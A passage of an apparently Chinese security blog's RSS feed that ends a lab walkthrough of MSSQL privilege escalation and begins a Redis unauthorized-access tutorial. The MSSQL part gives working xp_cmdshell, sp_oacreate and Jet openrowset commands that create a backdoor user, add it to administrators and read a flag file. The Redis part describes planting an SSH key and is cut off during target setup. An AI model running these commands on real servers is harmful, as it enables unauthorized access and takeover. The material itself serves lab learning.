&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#比如，账户名是HeyJack 密码也是HeyJack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net user HeyJack HeyJack /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927212339481.png&#34; alt=&#34;image-20220927212339481&#34;&gt;&lt;/p&gt;
&lt;p&gt;此时，我们在windows的cmd里，执行net user&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;这一步是在服务器里面查看。当然，现在只是为了展示我们的创建结果。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net user&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927212609276.png&#34; alt=&#34;image-20220927212609276&#34;&gt;&lt;/p&gt;
&lt;p&gt;“开始”菜单—管理工具—计算机管理—本地用户和组—用户—HeyJack右键属性—隶属于&lt;/p&gt;
&lt;p&gt;查看当前分组在Users组&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927212746484.png&#34; alt=&#34;image-20220927212746484&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;④第四步，将你新建的用户移到administrators组&#34;&gt;&lt;a href=&#34;#④第四步，将你新建的用户移到administrators组&#34; class=&#34;headerlink&#34; title=&#34;④第四步，将你新建的用户移到administrators组&#34;&gt;&lt;/a&gt;④第四步，将你新建的用户移到administrators组&lt;/h3&gt;&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net localgroup administrators HeyJack /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927213122417.png&#34; alt=&#34;image-20220927213122417&#34;&gt;&lt;/p&gt;
&lt;p&gt;继续查看我们的分组情况，可以看到，提权成功：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927213219218.png&#34; alt=&#34;image-20220927213219218&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;⑤第五步，获取远程服务器中的目标文件&#34;&gt;&lt;a href=&#34;#⑤第五步，获取远程服务器中的目标文件&#34; class=&#34;headerlink&#34; title=&#34;⑤第五步，获取远程服务器中的目标文件&#34;&gt;&lt;/a&gt;⑤第五步，获取远程服务器中的目标文件&lt;/h3&gt;&lt;p&gt;我们假设，服务器中管理员Administrator创建了一个flag.txt文件放在了桌面，我们的&lt;code&gt;最终目的&lt;/code&gt;就是&lt;strong&gt;为了获取它&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927221944235.png&#34; alt=&#34;image-20220927221944235&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;第一种方案，3389远程连接&#34;&gt;&lt;a href=&#34;#第一种方案，3389远程连接&#34; class=&#34;headerlink&#34; title=&#34;第一种方案，3389远程连接&#34;&gt;&lt;/a&gt;第一种方案，3389远程连接&lt;/h4&gt;&lt;p&gt;在win+R输入&lt;code&gt;mstsc&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927213803912.png&#34; alt=&#34;image-20220927213803912&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看服务器ip并在自己的客户端上连接，ip地址也可以通过SQL提权命令+ “ipconfig”来获取&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927221540178.png&#34; alt=&#34;image-20220927221540178&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后3389远程连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927213905588.png&#34; alt=&#34;image-20220927213905588&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入刚刚新建的用户民和密码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927214036680.png&#34; alt=&#34;image-20220927214036680&#34;&gt;&lt;/p&gt;
&lt;p&gt;登录成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927214149105.png&#34; alt=&#34;image-20220927214149105&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后打开“我的电脑”—进入C盘—找到“Documents and Settings”—选择“Administrators”—桌面—即可看到flag.txt&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927221815971.png&#34; alt=&#34;image-20220927221815971&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;第二种方案，使用SQL提权命令获取内容&#34;&gt;&lt;a href=&#34;#第二种方案，使用SQL提权命令获取内容&#34; class=&#34;headerlink&#34; title=&#34;第二种方案，使用SQL提权命令获取内容&#34;&gt;&lt;/a&gt;第二种方案，使用SQL提权命令获取内容&lt;/h4&gt;&lt;p&gt;另外，也可以使用SQL提权命令去当前管理员用户桌面查找（一般flag会放在桌面上）&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#dir命令查看当前路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;dir&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#type命令查看文件内容，一般低版本中，windows桌面的路径为：C:\Documents &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; Settings\桌面\flag.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;type C:\Documents and Settings\Administrator\桌面\flag.txt&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927221113281.png&#34; alt=&#34;image-20220927221113281&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x03-sp-oacreate提权步骤&#34;&gt;&lt;a href=&#34;#0x03-sp-oacreate提权步骤&#34; class=&#34;headerlink&#34; title=&#34;0x03 sp_oacreate提权步骤&#34;&gt;&lt;/a&gt;0x03 sp_oacreate提权步骤&lt;/h2&gt;&lt;h3 id=&#34;①第一步，更改当前服务器的全局配置首选高级选项为1-1&#34;&gt;&lt;a href=&#34;#①第一步，更改当前服务器的全局配置首选高级选项为1-1&#34; class=&#34;headerlink&#34; title=&#34;①第一步，更改当前服务器的全局配置首选高级选项为1&#34;&gt;&lt;/a&gt;①第一步，更改当前服务器的全局配置首选高级选项为1&lt;/h3&gt;&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;②第二步，配置OLE过程&#34;&gt;&lt;a href=&#34;#②第二步，配置OLE过程&#34; class=&#34;headerlink&#34; title=&#34;②第二步，配置OLE过程&#34;&gt;&lt;/a&gt;②第二步，配置OLE过程&lt;/h3&gt;&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;Ole Automation Procedures&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;③第三步，定义shell变量，int类型。&#34;&gt;&lt;a href=&#34;#③第三步，定义shell变量，int类型。&#34; class=&#34;headerlink&#34; title=&#34;③第三步，定义shell变量，int类型。&#34;&gt;&lt;/a&gt;③第三步，定义shell变量，int类型。&lt;/h3&gt;&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;declare&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;④第四步，生成shell对象&#34;&gt;&lt;a href=&#34;#④第四步，生成shell对象&#34; class=&#34;headerlink&#34; title=&#34;④第四步，生成shell对象&#34;&gt;&lt;/a&gt;④第四步，生成shell对象&lt;/h3&gt;&lt;p&gt;将结果赋值给第③步生成的shell变量里头。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oacreate &lt;span class=&#34;string&#34;&gt;&amp;#x27;wscript.shell&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; output;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;⑤第五步，调用shell对象的run方法来调用net-user&#34;&gt;&lt;a href=&#34;#⑤第五步，调用shell对象的run方法来调用net-user&#34; class=&#34;headerlink&#34; title=&#34;⑤第五步，调用shell对象的run方法来调用net user&#34;&gt;&lt;/a&gt;⑤第五步，调用shell对象的run方法来调用net user&lt;/h3&gt;&lt;p&gt;返回值是null，方法体是执行system32目录下的cmd.exe，并使用net user生成HeyJack1账号&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oamethod &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;run&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;c:\windows\system32\cmd.exe /c net user HeyJack1 HeyJack1 /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927230925606.png&#34; alt=&#34;image-20220927230925606&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;⑥第六步，调用shell对象的run方法来调用net-localgroup&#34;&gt;&lt;a href=&#34;#⑥第六步，调用shell对象的run方法来调用net-localgroup&#34; class=&#34;headerlink&#34; title=&#34;⑥第六步，调用shell对象的run方法来调用net localgroup&#34;&gt;&lt;/a&gt;⑥第六步，调用shell对象的run方法来调用net localgroup&lt;/h3&gt;&lt;p&gt;返回值是null，方法体是执行cmd，并使用net localgroup 将HeyJack1挪到administrators组下&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oacreate &lt;span class=&#34;string&#34;&gt;&amp;#x27;wscript.shell&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; output;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oamethod &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;run&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;c:\windows\system32\cmd.exe /c net localgroup administrators HeyJack1 /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927231033604.png&#34; alt=&#34;image-20220927231033604&#34;&gt;&lt;/p&gt;
&lt;p&gt;以上是使用sp_oacreate的提权语句，主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE对象），利用OLE对象的run方法执行系统命令。&lt;/p&gt;
&lt;p&gt;在oacreate的官方文档里明确指出了，如果要使用OLE对象，必须要开启 ‘Ole Automation Procedures’，也就是EXEC sp_configure ‘Ole Automation Procedures’, 1;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;执行上面这条语句前&lt;/strong&gt;要执行&lt;code&gt;exec sp_configure &amp;#39;show advanced options&amp;#39;, 1;&lt;/code&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;官方对这句话的解释是：&lt;/strong&gt;&lt;code&gt;show advanced options&lt;/code&gt;,&lt;strong&gt;“显示高级选项”&lt;/strong&gt;选项用来显示 sp_configure 系统存储过程高级选项。 &lt;/p&gt;
&lt;p&gt;当&lt;strong&gt;“显示高级选项”&lt;/strong&gt; 设置为&lt;code&gt;1&lt;/code&gt; 时，可以使用 sp_configure 列出高级选项。 &lt;code&gt;默认值为 0&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x04-沙盒提权步骤-不常用&#34;&gt;&lt;a href=&#34;#0x04-沙盒提权步骤-不常用&#34; class=&#34;headerlink&#34; title=&#34;0x04 沙盒提权步骤(不常用)&#34;&gt;&lt;/a&gt;0x04 沙盒提权步骤(不常用)&lt;/h2&gt;&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--提权语句&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;-- 不开启的话在执行xp_regwrite会提示让我们开启，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;Ad Hoc Distributed Queries&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_regwrite &lt;span class=&#34;string&#34;&gt;&amp;#x27;HKEY_LOCAL_MACHINE&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;SandBoxMode&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;REG_DWORD&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master.dbo.xp_regread &lt;span class=&#34;string&#34;&gt;&amp;#x27;HKEY_LOCAL_MACHINE&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;SandBoxMode&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--执行系统命令select * from openrowset(&amp;#x27;microsoft.jet.oledb.4.0&amp;#x27;,&amp;#x27;;database=c:/windows/system32/ias/ias.mdb&amp;#x27;,&amp;#x27;select shell(&amp;quot;net user HeyJack2 HeyJack2 /add&amp;quot;)&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; openrowset(&lt;span class=&#34;string&#34;&gt;&amp;#x27;microsoft.jet.oledb.4.0&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;;database=c:/windows/system32/ias/ias.mdb&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;select shell(&amp;quot;net localgroup administrators HeyJack2 /add&amp;quot;)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;沙盒模式SandBoxMode参数含义（默认是2）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0&lt;/code&gt;：在任何所有者中禁止启用安全模式&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1&lt;/code&gt; ：为仅在允许范围内&lt;/p&gt;
&lt;p&gt;&lt;code&gt;2&lt;/code&gt; ：必须在access模式下&lt;/p&gt;
&lt;p&gt;&lt;code&gt;3&lt;/code&gt;：完全开启&lt;/p&gt;
&lt;p&gt;openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--恢复配置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_regwrite &lt;span class=&#34;string&#34;&gt;&amp;#x27;HKEY_LOCAL_MACHINE&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;SandBoxMode&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;REG_DWORD&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;Ad Hoc Distributed Queries&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;至此，SQL Server(MSSQL)提权攻击演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</guid>
            <title>Redis提权攻击</title>
            <link>https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</link>
            <category>数据库安全</category>
            <pubDate>Tue, 27 Sep 2022 00:02:13 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;&lt;strong&gt;Redis&lt;/strong&gt;（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI &lt;a href=&#34;https://baike.baidu.com/item/C语言&#34;&gt;C语言&lt;/a&gt;编写、支持网络、可基于内存亦可持久化的日志型、Key-Value&lt;a href=&#34;https://baike.baidu.com/item/数据库/103728&#34;&gt;数据库&lt;/a&gt;，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由&lt;a href=&#34;https://baike.baidu.com/item/Pivotal&#34;&gt;Pivotal&lt;/a&gt;赞助。&lt;/p&gt;
&lt;h2 id=&#34;0x00-Redis提权攻击&#34;&gt;&lt;a href=&#34;#0x00-Redis提权攻击&#34; class=&#34;headerlink&#34; title=&#34;0x00 Redis提权攻击&#34;&gt;&lt;/a&gt;0x00 Redis提权攻击&lt;/h2&gt;&lt;p&gt;​    &lt;strong&gt;Redis&lt;/strong&gt;在默认情况下，会绑定在 0.0.0.0:&lt;strong&gt;6379&lt;/strong&gt;上，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等，这样将会将 Redis服务&lt;code&gt;暴露到公网&lt;/code&gt;上。&lt;/p&gt;
&lt;p&gt;​    如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。&lt;/p&gt;
&lt;p&gt;​    攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的&lt;code&gt;/root/.ssh&lt;/code&gt;文件夹的&lt;code&gt;authotrized_keys&lt;/code&gt;文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。&lt;/p&gt;
&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;类型&lt;/strong&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;strong&gt;目标靶机&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Ubuntu18.04&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;192.168.138.143&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;strong&gt;攻击主机&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Kali2022&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;192.168.138.145&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;p&gt;如果没有攻击机没有安装ssh则：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;安装&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt install openssh-server&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;启动ssh服务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo service ssh start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;0x01-被攻击机部分准备工作&#34;&gt;&lt;a href=&#34;#0x01-被攻击机部分准备工作&#34; class=&#34;headerlink&#34; title=&#34;0x01 被攻击机部分准备工作&#34;&gt;&lt;/a&gt;0x01 被攻击机部分准备工作&lt;/h2&gt;&lt;p&gt;在Ubuntu安装redis服务器&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo apt-get install redis-server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926212305161.png&#34; alt=&#34;image-20220926212305161&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改/etc/redis/redis.conf，总共有三点：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo vim /etc/redis/redis.conf&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926212807655.png&#34; alt=&#34;image-20220926212807655&#34;&gt;&lt;/p&gt;
&lt;p&gt;①去除bind&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926213107025.png&#34; alt=&#34;image-20220926213107025&#34;&gt;&lt;/p&gt;
&lt;p&gt;②daemonize yes&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926213521318.png&#34; alt=&#34;image-20220926213521318&#34;&gt;&lt;/p&gt;
&lt;p&gt;③protected-mode no&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232253189.png&#34; alt=&#34;image-20220926232253189&#34;&gt;&lt;/p&gt;
&lt;p&gt;重启服务&lt;/p&gt;
